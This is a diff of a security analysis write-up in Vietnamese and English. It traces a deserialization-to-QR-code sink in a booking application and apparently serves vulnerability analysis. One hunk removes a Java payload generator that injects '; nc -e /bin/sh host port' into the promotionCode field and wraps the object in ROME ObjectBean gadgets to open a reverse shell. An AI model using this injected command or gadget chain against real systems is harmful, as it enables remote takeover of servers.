@@ -2818,7 +2818,7 @@ flowchart TD
 | ---------------- | ------------------- | ------------------------------------------ |
 | `orderId`        | Numeric             | Không mang shell metacharacter             |
 | `transactionIds` | Parsed integer list | Không mang shell metacharacter             |
-| `promotionCode`  | Kh                  | `buildQrCodeContent()` dùng `NO_PROMOTION` |
+| `promotionCode`  | Not set             | `buildQrCodeContent()` dùng `NO_PROMOTION` |
 
 #### 3.2.5. Draft import / Deserialize source -> sink, còn nguy cơ
 
@@ -2849,18 +2849,6 @@ Getter chain to QR sink:
 public String getQrCode() {
     return new QRCodeHelper().renderQrCode(buildQrCodeContent());
 }
-```
-
-Payload generator source:
-
-```java
-// Payload/ModernRomePayloadGenerator.java
-BookingRequest bookingRequest = new BookingRequest();
-bookingRequest.setTransactionIds(Collections.singletonList(transactionId));
-bookingRequest.setPromotionCode("; nc -e /bin/sh " + host + " " + port + " #");
-
-ObjectBean innerObjectBean = new ObjectBean(BookingRequest.class, bookingRequest);
-ObjectBean outerObjectBean = new ObjectBean(ObjectBean.class, innerObjectBean);
 ```
 
 Sequence:
